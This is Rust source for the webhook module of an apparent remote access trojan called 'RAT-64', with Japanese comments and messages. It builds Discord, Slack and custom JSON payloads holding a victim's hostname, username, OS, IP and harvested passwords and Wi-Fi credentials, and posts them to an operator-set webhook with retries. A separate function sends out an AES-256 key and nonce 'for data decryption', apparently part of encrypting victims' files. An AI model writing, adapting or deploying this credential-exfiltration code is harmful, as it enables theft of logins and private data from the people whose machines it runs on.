// Webhook送信モジュール
use serde::{Serialize, Deserialize};
use std::time::Duration;

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum WebhookType {
    Discord,
    Slack,
    Custom,
    None,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct WebhookConfig {
    pub webhook_url: Option<String>,
    pub webhook_type: WebhookType,
    pub retry_attempts: u32,
    pub timeout_seconds: u64,
}

impl Default for WebhookConfig {
    fn default() -> Self {
        WebhookConfig {
            webhook_url: None,
            webhook_type: WebhookType::None,
            retry_attempts: 3,
            timeout_seconds: 30,
        }
    }
}

pub fn send_webhook(config: &WebhookConfig, system_info: &crate::SystemInfo, auth_data: &crate::AuthData) -> Result<(), Box<dyn std::error::Error>> {
    let webhook_url = match &config.webhook_url {
        Some(url) => url,
        None => return Ok(()),
    };

    let payload = match config.webhook_type {
        WebhookType::Discord => create_discord_payload(system_info, auth_data),
        WebhookType::Slack => create_slack_payload(system_info, auth_data),
        WebhookType::Custom => create_custom_payload(system_info, auth_data),
        WebhookType::None => return Ok(()),
    };

    let json_body = serde_json::to_string(&payload)?;

    for attempt in 1..=config.retry_attempts {
        match minreq::post(webhook_url)
            .with_header("Content-Type", "application/json")
            .with_header("User-Agent", "RAT-64/1.0")
            .with_body(json_body.clone())
            .with_timeout(config.timeout_seconds)
            .send() {
            Ok(response) => {
                if response.status_code >= 200 && response.status_code < 300 {
                    return Ok(());
                }
            },
            Err(_) => {}
        }
        
        if attempt < config.retry_attempts {
            std::thread::sleep(Duration::from_secs(2));
        }
    }
    
    Err("Webhook送信に失敗しました".into())
}

/// 暗号化キーをWebhookで送信する関数
pub fn send_encryption_key_webhook(config: &WebhookConfig, key: &[u8; 32], nonce: &[u8; 12]) -> Result<(), Box<dyn std::error::Error>> {
    let webhook_url = match &config.webhook_url {
        Some(url) => url,
        None => return Ok(()),
    };

    use base64::{engine::general_purpose, Engine as _};
    let key_b64 = general_purpose::STANDARD.encode(key);
    let nonce_b64 = general_purpose::STANDARD.encode(nonce);

    let payload = match config.webhook_type {
        WebhookType::Discord => create_discord_key_payload(&key_b64, &nonce_b64),
        WebhookType::Slack => create_slack_key_payload(&key_b64, &nonce_b64),
        WebhookType::Custom => create_custom_key_payload(&key_b64, &nonce_b64),
        WebhookType::None => return Ok(()),
    };

    let json_body = serde_json::to_string(&payload)?;

    for attempt in 1..=config.retry_attempts {
        match minreq::post(webhook_url)
            .with_header("Content-Type", "application/json")
            .with_header("User-Agent", "RAT-64/1.0")
            .with_body(json_body.clone())
            .with_timeout(config.timeout_seconds)
            .send() {
            Ok(response) => {
                if response.status_code >= 200 && response.status_code < 300 {
                    return Ok(());
                }
            },
            Err(_) => {}
        }
        
        if attempt < config.retry_attempts {
            std::thread::sleep(Duration::from_secs(2));
        }
    }
    
    Err("暗号化キーの送信に失敗しました".into())
}

// Build timestamp without pulling chrono unless the feature is enabled
#[cfg(any(feature = "datetime", feature = "network"))]
fn now_timestamp() -> String {
    chrono::Utc::now().to_rfc3339()
}

#[cfg(not(any(feature = "datetime", feature = "network")))]
fn now_timestamp() -> String {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
        .to_string()
}

fn create_discord_key_payload(key: &str, nonce: &str) -> serde_json::Value {
    serde_json::json!({
        "embeds": [{
            "title": "🔐 RAT-64 暗号化キー",
            "description": "データ復号化用の暗号化キーとナンス",
            "color": 0xff0000,
            "fields": [
                {"name": "🔑 AES-256 Key (Base64)", "value": format!("```\n{}\n```", key), "inline": false},
                {"name": "🎲 Nonce (Base64)", "value": format!("```\n{}\n```", nonce), "inline": false},
                {"name": "⚠️  警告", "value": "このキーは慎重に管理してください", "inline": false}
            ],
            "footer": {"text": format!("Generated: {}", now_timestamp())}
        }]
    })
}

fn create_slack_key_payload(key: &str, nonce: &str) -> serde_json::Value {
    serde_json::json!({
        "text": format!("🔐 RAT-64 暗号化キー\n```\nKey: {}\nNonce: {}\n```\n⚠️  このキーは慎重に管理してください", key, nonce)
    })
}

fn create_custom_key_payload(key: &str, nonce: &str) -> serde_json::Value {
    serde_json::json!({
        "encryption_key": key,
        "nonce": nonce,
        "timestamp": now_timestamp(),
        "type": "aes256_gcm_key"
    })
}

fn create_discord_payload(system_info: &crate::SystemInfo, auth_data: &crate::AuthData) -> serde_json::Value {
    let auth_summary = format!("🔐パスワード: {}件\n📶Wi-Fi: {}件", 
        auth_data.passwords.len(),
        auth_data.wifi_creds.len());

    serde_json::json!({
        "embeds": [{
            "title": "🚀 RAT-64 System Monitor Report",
            "description": format!("システム情報を収集しました"),
            "color": 0x00ff00,
            "fields": [
                {"name": "🏠 ホスト名", "value": system_info.hostname, "inline": true},
                {"name": "👤 ユーザー", "value": system_info.username, "inline": true},
                {"name": "💻 OS", "value": system_info.os_name, "inline": true},
                {"name": "🌐 IP", "value": system_info.local_ip, "inline": true},
                {"name": "🔐 認証情報", "value": auth_summary, "inline": false}
            ],
            "timestamp": now_timestamp(),
            "footer": {"text": "RAT-64 System Monitor"}
        }]
    })
}

fn create_slack_payload(system_info: &crate::SystemInfo, auth_data: &crate::AuthData) -> serde_json::Value {
    serde_json::json!({
        "blocks": [
            {
                "type": "header",
                "text": {
                    "type": "plain_text",
                    "text": "🚀 RAT-64 System Monitor Report"
                }
            },
            {
                "type": "section",
                "fields": [
                    {"type": "mrkdwn", "text": format!("*🏠 ホスト名:*\n{}", system_info.hostname)},
                    {"type": "mrkdwn", "text": format!("*👤 ユーザー:*\n{}", system_info.username)},
                    {"type": "mrkdwn", "text": format!("*💻 OS:*\n{}", system_info.os_name)},
                    {"type": "mrkdwn", "text": format!("*🌐 IP:*\n{}", system_info.local_ip)},
                ]
            },
            {
                "type": "section",
                "text": {
                    "type": "mrkdwn",
                    "text": format!("*🔐 認証情報:*\n• パスワード: {}件\n• Wi-Fi: {}件", 
                             auth_data.passwords.len(), auth_data.wifi_creds.len())
                }
            }
        ]
    })
}

fn create_custom_payload(system_info: &crate::SystemInfo, auth_data: &crate::AuthData) -> serde_json::Value {
    serde_json::json!({
        "timestamp": std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs(),
        "system_info": system_info,
        "auth_data": auth_data
    })
}
